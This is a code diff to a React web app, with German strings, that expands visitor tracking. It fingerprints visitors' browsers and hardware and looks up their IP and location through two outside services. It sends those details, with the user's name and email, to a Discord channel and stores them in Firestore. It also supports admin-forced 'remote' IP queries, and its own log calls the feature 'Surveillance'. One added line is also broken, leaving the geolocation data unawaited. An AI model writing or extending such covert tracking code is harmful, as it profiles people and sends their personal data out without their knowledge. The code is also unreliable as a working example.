@@ -402,48 +402,64 @@ export default function App() {
     }
   };
 
-  // Fetch IP and Location Info
+  // Fetch IP and Location Info (DUAL-TRACE SYSTEM)
   const trackVisitor = async (isManualUpdate = false) => {
     try {
-      const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) });
-      if (!res.ok) throw new Error('IP API non-ok response');
-      const data = await res.json();
+      // Primary Trace
+      const res1 = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(6000) });
+      const data1 = res1.ok ? await res1.ok && res1.json() : null;
       
-      setVisitorInfo(data);
+      // Secondary Verification (ipify)
+      const res2 = await fetch('https://api.ipify.org?format=json');
+      const data2 = res2.ok ? await res2.json() : null;
+
+      const finalIp = data2?.ip || data1?.ip || 'Verborgen';
+      const city = data1?.city || 'Unbekannt';
       
+      setVisitorInfo(data1 || { ip: finalIp, city: 'Scanning...', region: '...', country_name: '...', org: '...' });
+      
+      // Advanced System Signature
+      const systemSig = {
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || '?',
+        agent: navigator.userAgent
+      };
+
       // Detailed Discord Logging
-      const eventTitle = isManualUpdate ? "🔍 MANUELLE IP-ABFRAGE (GELUNGEN)" : "🌐 BESUCHER-TRACKING";
-      const eventColor = isManualUpdate ? 16733202 : 3447003;
+      const eventTitle = isManualUpdate ? "🔴 KRITISCHER SYSTEM-SCAN ERZWUNGEN" : "🌐 BESUCHER-TRACKING AKTIVIERT";
+      const eventColor = isManualUpdate ? 16711680 : 3447003;
 
       notifyDiscord(
         eventTitle,
-        `**Status:** ${isManualUpdate ? 'Erzwungene Aktualisierung' : 'Neuer Site-Aufruf'}\n` +
-        `**User:** ${myProfile?.displayName || 'Unbekannt'} (${auth.currentUser?.email || 'N/A'})\n` +
-        `**Echte IP:** \`${data.ip}\`\n` +
-        `**Standort:** ${data.city || '?'}, ${data.region || '?'} (${data.country_name || '?'})\n` +
-        `**Provider:** ${data.org || '?'}\n` +
-        `**ASN:** ${data.asn || '?'}\n` +
-        `**UA:** ${navigator.userAgent.substring(0, 100)}...`,
+        `**Status:** ${isManualUpdate ? 'Erzwungene Fern-Abfrage' : 'Automatischer Check'}\n` +
+        `**Mitglied:** ${myProfile?.displayName || 'Gast'} (${auth.currentUser?.email || 'Keine Mail'})\n` +
+        `**BESTÄTIGTE IP:** \`${finalIp}\`\n` +
+        `**Geo-Daten:** ${city}, ${data1?.region || '?'} (${data1?.country_name || '?'})\n` +
+        `**Provider:** ${data1?.org || '?'}\n` +
+        `**Hardware:** ${systemSig.platform} | ${systemSig.screen} | ${systemSig.cores} Cores\n` +
+        `**Browser:** ${systemSig.language} | ${systemSig.agent.substring(0, 100)}...`,
         eventColor
       );
 
-      // Save to profile if user is logged in
       if (user) {
         await setDoc(doc(db, 'user_profiles', user.uid), {
-          lastLoginIp: data.ip,
-          lastLoginCity: data.city,
-          lastLoginOrg: data.org,
-          lastLoginAsn: data.asn,
-          requestIpUpdate: false, // Flag zurücksetzen
-          updatedAt: serverTimestamp()
+          lastLoginIp: finalIp,
+          lastLoginCity: city,
+          lastLoginOrg: data1?.org || 'N/A',
+          lastSync: serverTimestamp(),
+          requestIpUpdate: false,
+          systemInfo: {
+            platform: systemSig.platform,
+            res: systemSig.screen,
+            lastSeen: new Date().toISOString()
+          }
         }, { merge: true });
       }
-      return data;
+      return finalIp;
     } catch (e) {
-      console.warn("IP Tracking failed", e);
-      if (!visitorInfo) {
-        setVisitorInfo({ ip: 'Verborgen', city: 'Proxy/VPN', region: 'Deep Web', country_name: 'Unbekannt', org: 'Anonymous' });
-      }
+      console.warn("Surveillance Trace-Error", e);
       return null;
     }
   };
